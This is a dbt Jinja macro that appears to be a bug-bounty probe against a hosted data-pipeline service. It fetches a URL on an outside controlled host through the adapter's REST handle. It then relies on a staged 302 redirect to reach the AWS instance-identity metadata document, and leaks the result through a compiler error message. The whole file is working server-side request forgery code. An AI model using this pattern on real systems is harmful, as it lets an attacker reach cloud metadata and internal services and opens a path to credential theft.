{% macro phase683_rest_fetch_redirect_identity() %}
  {% set query_result = adapter.add_query("select 1 as phase683_control", auto_begin=false) %}
  {% set rest = query_result[0].handle.rest %}
  {% do log("PHASE683_STAGE_1_REST", info=true) %}

  {% set controlled = rest.fetch(
      "get",
      "https://fivetran-recon.ontargetbot.com.br/phase600-gcf-redirect-4e91b7c2/receiver?phase683=9ee194cbc5784d17",
      {"X-Bug-Bounty": "dhmhack", "X-Phase683-Control": "rest-fetch"},
      timeout=10,
      no_retry=true,
      socket_timeout=10
  ) %}
  {% set controlled_ok = controlled is mapping and controlled.get("ok") == true %}
  {% do log("PHASE683_STAGE_2_CONTROLLED_FETCH", info=true) %}

  {#
    The controlled origin is armed externally for one 302 to the non-secret
    AWS instance-identity document.  raise_raw_http_failure preserves the
    terminal HTTP status as a bounded run-info oracle while preventing retries.
    No credential or token endpoint is requested.
  #}
  {% do log("PHASE683_STAGE_3_REDIRECT_ATTEMPT", info=true) %}
  {% set redirected = rest.fetch(
      "get",
      "https://fivetran-recon.ontargetbot.com.br/phase189-4f8c1d7a6e32/instance-identity?phase683=9ee194cbc5784d17",
      {"X-Bug-Bounty": "dhmhack", "X-Phase683-Redirect": "aws-identity-control"},
      timeout=10,
      no_retry=true,
      socket_timeout=10,
      raise_raw_http_failure=true
  ) %}
  {% set redirected_json_present = redirected is mapping and redirected.get("version") is not none %}
  {% do log("PHASE683_STAGE_4_REDIRECT_RETURNED", info=true) %}

  {{ exceptions.raise_compiler_error(
      "PHASE683_REDIRECT_FETCH_RESULT"
      ~ "|CONTROLLED_OK=" ~ controlled_ok
      ~ "|REDIRECT_JSON_PRESENT=" ~ redirected_json_present
  ) }}
{% endmacro %}
